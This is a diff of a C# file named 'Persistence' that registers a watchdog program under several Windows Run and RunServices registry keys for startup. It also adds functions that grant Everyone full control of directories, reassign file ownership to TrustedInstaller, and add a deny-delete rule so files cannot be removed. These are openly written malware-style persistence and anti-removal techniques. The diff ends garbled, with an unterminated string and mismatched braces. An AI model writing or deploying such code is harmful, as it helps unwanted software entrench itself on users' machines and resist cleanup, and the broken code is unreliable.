@@ -13,6 +13,9 @@ namespace Persistence
 
         public static void runAllTechniques()
         {
+            
+            
+            
             SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce", "RunOnSystemStartTask", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); // Run Keys on startup
             SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce", "WindowsRunOnSystemStartTask", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
             SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServices", "BootVerification", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
@@ -180,49 +183,164 @@ namespace Persistence
                 }
             }
 
-            public static void GrantEveryoneFullControlOnDirectory(string directoryPath)
+        public static void GrantEveryoneFullControlOnDirectory(string directoryPath) // applies full control to the directories and subdirectories
+        {
+            try
             {
-                try
+                // Check if the directory exists
+                if (!Directory.Exists(directoryPath))
                 {
-                    // Check if the directory exists
-                    if (!Directory.Exists(directoryPath))
-                    {
-                        throw new DirectoryNotFoundException($"The specified directory does not exist: {directoryPath}");
-                    }
-
-                    // Get the current access control settings for the directory
-                    DirectoryInfo directoryInfo = new DirectoryInfo(directoryPath);
-                    DirectorySecurity directorySecurity = directoryInfo.GetAccessControl();
-
-                    // Create a new rule that grants "Everyone" full control
-                    FileSystemAccessRule rule = new FileSystemAccessRule(
-                        new SecurityIdentifier(WellKnownSidType.WorldSid, null), // "Everyone" group
-                        FileSystemRights.FullControl,                           // Full control
-                        InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, // Inherit permissions to all subfolders and files
-                        PropagationFlags.None,                                  // Don't propagate further
-                        AccessControlType.Allow                                 // Allow the rule
-                    );
-
-                    // Add the rule to the directory security object
-                    directorySecurity.AddAccessRule(rule);
-
-                    // Apply the modified security settings to the directory
-                    directoryInfo.SetAccessControl(directorySecurity);
-
-                    Console.WriteLine($"Successfully granted 'Everyone' full control on the directory: {directoryPath}");
+                    throw new DirectoryNotFoundException($"The specified directory does not exist: {directoryPath}");
                 }
-                catch (UnauthorizedAccessException ex)
-                {
-                    Console.WriteLine("Error: Access denied. Run the application with administrator privileges.");
-                }
-                catch (DirectoryNotFoundException ex)
-                {
-                    Console.WriteLine($"Error: {ex.Message}");
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine($"An error occurred: {ex.Message}");
-                }
+
+                // Get the current access control settings for the directory
+                DirectoryInfo directoryInfo = new DirectoryInfo(directoryPath);
+                DirectorySecurity directorySecurity = directoryInfo.GetAccessControl();
+
+                // Create a new rule that grants "Everyone" full control, but only on directories (not files)
+                FileSystemAccessRule rule = new FileSystemAccessRule(
+                    new SecurityIdentifier(WellKnownSidType.WorldSid, null), // "Everyone" group
+                    FileSystemRights.FullControl,                           // Full control
+                    InheritanceFlags.ContainerInherit,                      // Inherit permissions only to subdirectories
+                    PropagationFlags.None,                                  // Don't propagate to child objects
+                    AccessControlType.Allow                                 // Allow the rule
+                );
+
+                // Add the rule to the directory security object
+                directorySecurity.AddAccessRule(rule);
+
+                // Apply the modified security settings to the directory
+                directoryInfo.SetAccessControl(directorySecurity);
+
+                Console.WriteLine($"Successfully granted 'Everyone' full control on the directory and subdirectories: {directoryPath}");
             }
+            catch (UnauthorizedAccessException ex)
+            {
+                Console.WriteLine("Error: Access denied. Run the application with administrator privileges.");
+            }
+            catch (DirectoryNotFoundException ex)
+            {
+                Console.WriteLine($"Error: {ex.Message}");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"An error occurred: {ex.Message}");
+            }
+        }
+
+
+        public void ChangeOwnershipToTrustedInstaller(string filePath)
+        {
+            try
+            {
+                // Ensure the file exists
+                if (!File.Exists(filePath))
+                {
+                    throw new FileNotFoundException($"File not found: {filePath}");
+                }
+
+                // Get the current ACL of the file
+                FileSecurity fileSecurity = File.GetAccessControl(filePath);
+
+                // Create a security identifier for 'TrustedInstaller'
+                NTAccount trustedInstallerAccount = new NTAccount("NT SERVICE\\TrustedInstaller");
+
+                // Check current owner
+                IdentityReference currentOwner = fileSecurity.GetOwner(typeof(NTAccount));
+                if (currentOwner.Value.Equals(trustedInstallerAccount.Value, StringComparison.OrdinalIgnoreCase))
+                {
+                    Console.WriteLine($"Ownership of the file is already set to 'TrustedInstaller'. No changes made.");
+                    return;
+                }
+
+                // Set the owner to TrustedInstaller
+                fileSecurity.SetOwner(trustedInstallerAccount);
+
+                // Apply the new security settings to the file
+                File.SetAccessControl(filePath, fileSecurity);
+
+                Console.WriteLine($"Successfully changed file ownership to 'TrustedInstaller' for {filePath}");
+            }
+            catch (UnauthorizedAccessException ex)
+            {
+                Console.WriteLine("Error: Access denied. Run the application with administrator privileges.");
+            }
+            catch (FileNotFoundException ex)
+            {
+                Console.WriteLine($"Error: {ex.Message}");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"An error occurred: {ex.Message}");
+            }
+        }
+
+
+
+        public void MakeFileUndeletable(string filePath)
+        {
+            try
+            {
+                // Ensure the file exists
+                if (!File.Exists(filePath))
+                {
+                    throw new FileNotFoundException($"File not found: {filePath}");
+                }
+
+                // Get the current ACL of the file
+                FileSecurity fileSecurity = File.GetAccessControl(filePath);
+
+                // Define a SID for the 'Everyone' group
+                SecurityIdentifier everyoneSid = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
+
+                // Check if the deny rule for deleting is already in place
+                bool deleteDenyExists = false;
+                foreach (FileSystemAccessRule rule in fileSecurity.GetAccessRules(true, true, typeof(SecurityIdentifier)))
+                {
+                    if (rule.IdentityReference == everyoneSid &&
+                        rule.FileSystemRights.HasFlag(FileSystemRights.Delete) &&
+                        rule.AccessControlType == AccessControlType.Deny)
+                    {
+                        deleteDenyExists = true;
+                        break;
+                    }
+                }
+
+                if (deleteDenyExists)
+                {
+                    Console.WriteLine($"File '{filePath}' is already protected from deletion. No changes made.");
+                    return;
+                }
+
+                // Create a deny rule for deleting the file
+                FileSystemAccessRule denyDeleteRule = new FileSystemAccessRule(
+                    everyoneSid,
+                    FileSystemRights.Delete,
+                    InheritanceFlags.None,
+                    PropagationFlags.None,
+                    AccessControlType.Deny
+                );
+
+                // Add the rule to the file's ACL
+                fileSecurity.AddAccessRule(denyDeleteRule);
+
+                // Apply the new security settings to the file
+                File.SetAccessControl(filePath, fileSecurity);
+
+                Console.WriteLine($"Successfully made the file '{filePath}' undeletable.");
+            }
+            catch (UnauthorizedAccessException ex)
+            {
+                Console.WriteLine("Error: Access denied. Run the application with administrator privileges.");
+            }
+            catch (FileNotFoundException ex)
+            {
+                Console.WriteLine($"Error: {ex.Message}");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"An error
+        
+
     }
-}
+        }
